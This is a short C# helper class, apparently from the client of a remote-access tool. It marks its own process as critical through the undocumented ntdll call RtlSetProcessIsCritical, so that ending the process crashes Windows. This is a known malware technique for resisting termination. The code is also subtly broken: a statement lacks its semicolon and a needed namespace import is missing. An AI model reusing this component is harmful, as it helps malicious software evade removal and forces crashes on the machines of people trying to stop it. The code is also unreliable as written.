using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Client.Helper
{
    public static class ProcessCritical
    {      
        public static void Set()
        {
            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
            }
            catch { }
        }
        public static void Exit()
        {
            try
            {
                RtlSetProcessIsCritical(0, 0, 0);
            }
            catch 
            { 
            while(true)
                {
                Thread.Sleep(100000) //prevents a BSOD on exit failure
                }
            }
        }

        #region "Native Methods"
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        #endregion
    }
}
